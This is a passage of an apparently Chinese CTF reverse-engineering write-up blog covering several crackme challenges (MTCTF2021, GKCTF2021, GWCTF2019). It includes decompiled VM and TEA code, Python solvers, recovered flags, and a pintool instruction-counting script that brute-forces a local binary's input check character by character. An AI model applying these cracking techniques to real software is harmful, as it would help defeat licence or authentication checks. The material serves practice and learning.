class="number">32</span>*(j%<span class="number">3</span>)+i] = i+<span class="number">1</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span>(v1[<span class="number">32</span>*i+j]!=<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(v1[<span class="number">32</span>*i+j],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pos = [<span class="number">1</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">26</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">27</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">22</span>,<span class="number">28</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag[pos[i]-<span class="number">1</span>] = enc[i]</span><br><span class="line">flag[-<span class="number">1</span>] ^= flag[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= flag[i+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag:<br><strong>Th4_1mp0rtant_th2n9_is_t0_le@rn!</strong></p><h1 id="MTCTF2021"><a href="#MTCTF2021" class="headerlink" title="MTCTF2021"></a>MTCTF2021</h1><h2 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h2><p>夹杂着一个天堂之门 lazydump出来静态分析<br>一个魔改的xxtea 主要是rounds改为了12 然后n&#x3D;9 解就完了</p><h2 id="Superflat"><a href="#Superflat" class="headerlink" title="Superflat"></a>Superflat</h2><p>mov混淆<br>工具demovfuscator一直一直安不好…<br>这里学习使用pintool来进行求解<br>学习:<br><a href="https://s0uthwood.github.io/post/all-solves-during-a-weekend/">s0uthwood</a><br><a href="https://www.cnblogs.com/level5uiharu/p/16963907.html">pintool</a></p><p>这里有个小坑 64位ubuntu需要安装兼容32位的gcc才能make ia32…</p><p>ida硬看汇编 可以发现getchar和putchar字样<br>猜测是逐字符判断 这种都可以祭出pintool<br>原理: 利用正确与错误分别对应的指令执行条数不同 (类似侧信道攻击)<br>首先要满足42位len的check 然后尝试发现(用已知第一个字符为f)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: Count 584288</span><br><span class="line">faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: Count 589176</span><br></pre></td></tr></table></figure><p>所以可以利用这个点来进行爆破<br>pintool用法:<br>在 <code>pin-3.30-98830-g1d7b601b3-gcc-linux/source/tools/ManualExamples</code> 下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;d06f0bcc-93e0-9c5b-161e-e146417&quot;</span>+<span class="number">5</span>*<span class="string">&quot;a&quot;</span>+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">table = <span class="string">&quot;012f3456789abcde-&quot;</span></span><br><span class="line"></span><br><span class="line">now = <span class="number">36</span></span><br><span class="line">prev_cnt = <span class="number">759287</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>(now&gt;=<span class="number">41</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> table:</span><br><span class="line">        cmd = <span class="string">&quot;echo &quot;</span>+flag[:now]+x+flag[now+<span class="number">1</span>:]+<span class="string">&quot; | ../../../pin -t obj-ia32/inscount0.so -o superflat.log -- ./superflat; cat ./superflat.log&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(flag[:now]+x+flag[now+<span class="number">1</span>:])</span><br><span class="line">        output = subprocess.check_output(cmd,shell=<span class="literal">True</span>,stderr=subprocess.PIPE)   </span><br><span class="line">        now_cnt = <span class="built_in">int</span>(output.split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">1</span>].split()[<span class="number">1</span>].decode())</span><br><span class="line"><span class="comment">#        print(output,now_cnt)</span></span><br><span class="line">        <span class="keyword">if</span> now_cnt-prev_cnt&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+]RIGHT!    <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line">            flag = flag[:now]+x+flag[now+<span class="number">1</span>:]</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">            prev_cnt = now_cnt</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] WRONG!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里贴的是后半部分的 从头开始的话改一改now prev_cnt 即可<br>爆破得到flag<br><strong>flag{d06f0bcc-93e0-9c5b-161e-e1464176d395}</strong></p><h1 id="GKCTF2021"><a href="#GKCTF2021" class="headerlink" title="GKCTF2021"></a>GKCTF2021</h1><h2 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h2><p>虽说整个题目莫名其妙的(指虽然能找到base58以及密文 但是不知道怎么调用到的 网上没找到一篇讲到调用原理的…)<br>但是借此机会了解一下QT<br>了解一下 对象树 信号&#x2F;槽通信 的概念<br><a href="https://www.freebuf.com/articles/ics-articles/328193.html">+</a></p><h2 id="App-debug"><a href="#App-debug" class="headerlink" title="App-debug"></a>App-debug</h2><p>jadx打开 发现load了.so库 IDA查看<br>找到 Java_com_example_myapplication_MainActivity_check<br>发现TEA加密<br>先看TEA加密<br>重点在于发现key[]是修改过的 这种交叉引用即可查看到正确的值<br>逆出来两个整数</p><p>这种load c的库的apk最烦人的点就在于层之间接口的数据传递<br>这题:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_3FE20</span>(a1, a3, (__int64)v6);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">sub_40040</span>((__int64)v6) == <span class="number">8</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;unk_C80E0 + i) = *(_BYTE *)<span class="built_in">sub_40064</span>((__int64)v6, i);</span><br><span class="line">  v5 = <span class="built_in">TEA</span>((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_C80E0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_3FE20:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="built_in">sub_40094</span>(a1, <span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_400CC</span>(a1, <span class="string">&quot;GB2312&quot;</span>);</span><br><span class="line">  v7 = <span class="built_in">sub_40104</span>(a1, v9, <span class="string">&quot;getBytes&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)[B&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">sub_4014C</span>(a1, a2, v7, v8);</span><br><span class="line">  v5 = <span class="built_in">sub_4024C</span>(a1, v6);</span><br></pre></td></tr></table></figure><p>所以知道是long_to_bytes&#x2F;bytes_to_long 这种<br>这两个数字转出来分别是<br>TcKG 和 0gF<br>注意下端序 以及sub_40040的len check要满足&#x3D;&#x3D;8 所以末尾再补个空格 apk验证正确<br>“GKcTFg0 “<br>但是md5的时候又要把空格去掉…<br>flag:<br><strong>flag{77bca47fe645ca1bd1ac93733171c9c4}</strong></p><h1 id="GWCTF2019"><a href="#GWCTF2019" class="headerlink" title="GWCTF2019"></a>GWCTF2019</h1><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>vm opcode<br>记得几个月前看还没什么头绪 也静不下心来逆向 在计组知识学习深入后再来看就好多了</p><p>main:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input something:&quot;</span>);</span><br><span class="line">  <span class="built_in">SETUP</span>((__int64)v3);</span><br><span class="line">  <span class="built_in">EXECUTE_OPCODE</span>((__int64)v3);</span><br><span class="line">  <span class="built_in">FALSE_FINAL_CHECK</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And the flag is GWHT&#123;true flag&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SETUP:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">SETUP</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">0x12</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;OPCODE;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = F1_sub_56088D000B5F;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = F2_XOR;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = F5_INPUT_AND_CHECK_LEN;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = F4_sub_55E3A8C00956;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = F7_MUL;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = F8_SWAP;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = F6_LINERAL_CAL;</span><br><span class="line">  INPUT = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(INPUT, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到执行opcode的时候写了个0xF4停止 但是此时发现没出现过前文的mul等函数<br>这是因为第一个0xF4后面一堆0过后还会继续执行第二阶段</p><p>查看每个函数<br>F1: 设置寄存器&#x2F;赋值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">F1_sub_56088D000B5F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = (<span class="type">int</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE1</span>:</span><br><span class="line">      *(_DWORD *)a1 = *((<span class="type">char</span> *)INPUT + *v2);   <span class="comment">// reg1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE2</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) = *((<span class="type">char</span> *)INPUT + *v2);<span class="comment">// reg2</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE3</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">8</span>) = *((<span class="type">char</span> *)INPUT + *v2);<span class="comment">// reg3</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE4</span>:</span><br><span class="line">      *((_BYTE *)INPUT + *v2) = *(_DWORD *)a1;  <span class="comment">// input[] = reg1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE5</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = *((<span class="type">char</span> *)INPUT + *v2);<span class="comment">// reg4</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE7</span>:</span><br><span class="line">      *((_BYTE *)INPUT + *v2) = *(_DWORD *)(a1 + <span class="number">4</span>);<span class="comment">// input[] = reg2</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) += <span class="number">6LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的都没什么难点<br>这里有个地方感觉reg对应不算很清晰<br>但也能猜到是swap(reg1,reg2) 只是有可能是带着地址的指针交换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">F8_SWAP</span><span class="params">(<span class="type">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  *a1 = a1[<span class="number">1</span>];</span><br><span class="line">  a1[<span class="number">1</span>] = v2;</span><br><span class="line">  ++*((_QWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python提取opcode打印字节码:<br>要注意到reg2最初是赋了值的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span 